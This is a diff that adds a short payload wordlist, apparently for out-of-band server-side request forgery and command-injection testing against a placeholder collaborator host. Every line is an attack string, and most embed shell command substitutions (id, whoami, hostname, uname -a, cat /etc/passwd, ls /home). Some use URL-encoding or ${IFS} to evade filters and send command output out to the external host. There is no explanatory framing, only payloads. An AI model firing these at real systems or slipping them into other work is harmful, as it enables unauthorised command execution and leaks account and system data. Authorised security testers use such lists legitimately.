@@ -1,0 +1,15 @@
+https://your-collab
+https://your-collab:22
+https://your-collab:25
+http://your-collab/id``
+http://your-collab/$(id)
+http://your-collab/whoami``
+http://your-collab/$(whoami)
+http://your-collab/uname -a``
+http://your-collab/$(uname -a)
+http://your-collab/%24(id)
+http://your-collab/%24(whoami)
+http://your-collab/cat${IFS}/etc/passwd``
+http://your-collab/$(cat${IFS}/etc/passwd)
+http://your-collab/$(hostname)
+http://your-collab/$(ls${IFS}/home/)
